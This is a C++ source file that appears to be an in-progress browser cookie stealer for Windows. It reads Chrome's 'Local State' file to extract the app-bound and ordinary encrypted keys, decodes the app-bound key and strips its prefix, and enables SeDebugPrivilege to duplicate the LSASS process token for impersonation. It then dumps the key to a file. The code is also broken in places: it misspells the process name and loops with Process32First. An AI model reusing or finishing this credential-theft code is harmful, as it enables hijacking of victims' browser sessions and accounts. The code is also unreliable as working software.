#include <windows.h>
#include <bcrypt.h>
#include <nlohmann/json.hpp>
#include <filesystem>
#include <shlobj.h>
#include <knownfolders.h>
#include <wincrypt.h>
#include <vector>
#include <fstream>
#include <stdio.h>
#include <tlhelp32.h>

#define PREFIX_SIZE 4
using json = nlohmann::json;
namespace fs = std::filesystem;

/*
MSVC MSVC MSVC MSVC MSVC MSVC MSVC


#pragma comment(lib, "bcrypt.lib");


MSVC MSVC MSVC MSVC MSVC MSVC MSVC
*/
class ImpersonateLSSAS {
    public:
    ImpersonateLSSAS() {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE, &token)) throw std::runtime_error("1");
    }
    DWORD GetLssasPid() {
        PROCESSENTRY32 pe32 = {sizeof(PROCESSENTRY32)};
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            printf("hSnapshot (GetLssasPID) has INVALID_HANDLE_VALUE\n");
            return 0; 
        }

        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, L"lssas.exe") == 0) {
                    printf("lssas.exe pid was found, returning it %lu...\n", pe32.th32ProcessID);
                    return pe32.th32ProcessID;
                }
            } while(Process32First(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    HANDLE getHandle() const {return token;}
    BOOL setPrivilige(HANDLE hToken) {
    //TRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASH
        TOKEN_PRIVILEGES tp;
        LUID luid;

        if (!LookupPrivilegeValueA( 
            NULL,
            "SeDebugPrivilege",
            &luid
        )) {
            printf("LookupPrivilegeValueA() failed, IMPERSONATELSSAS failed\n");
            return FALSE;
        }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    //TRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASH

    DWORD pid = GetLssasPid();
    HANDLE lsassProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);


    HANDLE lsassAcessToken = NULL;
    if (!OpenProcessToken(lsassProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &lsassAcessToken)) {
        printf("lsass access token quering failed error: %u", GetLastError());
        return FALSE;
    }

    HANDLE duplicatedToken = NULL;
    DuplicateTokenEx(lsassAcessToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicatedToken);

    //PROCESS CREATION HERE

    //TRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASH
    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        0,
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL
    )) {
        printf("AdjustTokenPrivileges() failed, IMPERSONATELSSAS failed error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("GetLastError() NOT_ALL_ASSIGNED");
        return FALSE;
    }

        printf("Privileges set successfully!\n");
        return TRUE;
        //TRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASHTRASH
    }
    private:
    HANDLE token;
};

class CookieDecryptor {
    public:
    //private:
        //---------------------------------------------------
        struct DecryptorMain {
            std::vector<BYTE> decodedEncryptedKey;
            BOOL removePrefix() {
                if (!decodedEncryptedKey.empty()) {

                    printf("\n\n\nDECODED BASE64 APPBOUNDKEY: %s\n", reinterpret_cast<const char*>(decodedEncryptedKey.data()));
                    
                    if (std::memcmp(decodedEncryptedKey.data(), "APPB", PREFIX_SIZE) == 0) {
                        std::vector<BYTE> withoutPrefix = std::vector<BYTE>(decodedEncryptedKey.begin() + PREFIX_SIZE, decodedEncryptedKey.end());
                        this->decodedEncryptedKey = withoutPrefix;                        
                        printf("Prefix has been removed successfully!\n");
                        return TRUE;
                    }
                    /*
                    std::ofstream binary("some.bin", std::ios::binary);
                    binary.write(reinterpret_cast<const char*>(temp), PREFIX_SIZE);
                    */
                    printf("Prefix hasn't been found, so never mind\n");
                } else {
                    printf("DecodedEncryptedKey is empty, removePrefix() failed!\n");
                }
                return FALSE;
            }
            std::vector<BYTE> decodeBase64(const std::string& input) {

                DWORD size = 0;
                std::vector<BYTE> output;
                if (CryptStringToBinaryA(
                    input.c_str(),
                    0,
                    CRYPT_STRING_BASE64,
                    NULL,
                    &size,
                    NULL,
                    NULL
                )) 
                {
                    output = std::vector<BYTE>(size);
                    if (CryptStringToBinaryA(
                        input.c_str(),
                        0,
                        CRYPT_STRING_BASE64,
                        output.data(),
                        &size,
                        NULL,
                        NULL
                    )) {
                        printf("Sequence of byte has been sucessfully read into decodedEncryptedKey!\n");
                        this->decodedEncryptedKey = output;
                    }
                }

                return output;
            }    
            
        };
        struct KeyExtractor {
            //LETS DO SOME HARDCODE
            std::string app_bound_encrypted_key = "";
            std::string encrypted_key = "";
            BOOL getKey() {
                WCHAR* appdata_path;
                std::string app_bound_key = "";
                std::string key = "";

                if (SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &appdata_path) == S_OK) {
                    //printf("AppData path: %ls\n", appdata_path);
                
                    fs::path browser_path = appdata_path;
                    browser_path = browser_path / "Google" / "Chrome" / "User Data";
                    //printf("browser_path: %ls\n", browser_path.c_str());

                        fs::path local_state_path = browser_path / "Local State";
                        //printf("local_state_path: %ls\n", local_state_path.c_str());
                        if (fs::exists(local_state_path)) {
                            std::ifstream file(local_state_path, std::ios::binary);
                            json json_parsed;
            
                            file >> json_parsed;
                            app_bound_key = json_parsed["os_crypt"]["app_bound_encrypted_key"].get<std::string>();
                            key = json_parsed["os_crypt"]["encrypted_key"].get<std::string>();
                            file.close();
                            
                        
                            this->app_bound_encrypted_key = app_bound_key;
                            this->encrypted_key = key;
                            return TRUE;
                        };
                } 
                return FALSE;
            };

            void printKeys() const {
                if (this->app_bound_encrypted_key != "" && this->encrypted_key != "") {
                printf("Here is your keys:\n\n\nAPP_BOUND_ENCRYPTED_KEY: %s\n\n\nENCRYPTED_KEY: %s\n", this->app_bound_encrypted_key.c_str(), this->encrypted_key.c_str());
                } else {
                printf("There aren't any keys to print out!\n");
                }
            }
        };
        //---------------------------------------------------
    public:
};


int main() {
    CookieDecryptor::KeyExtractor z;
    CookieDecryptor::DecryptorMain d;
    z.getKey();
    z.printKeys();    
    
    d.decodeBase64(z.app_bound_encrypted_key);
    BOOL returnvalue = d.removePrefix();

    ImpersonateLSSAS ls;
    ls.setPrivilige(ls.getHandle());
    std::ofstream writer("some.bin");
    writer.write(reinterpret_cast<const char*>(d.decodedEncryptedKey.data()), d.decodedEncryptedKey.size());
    return 0;
};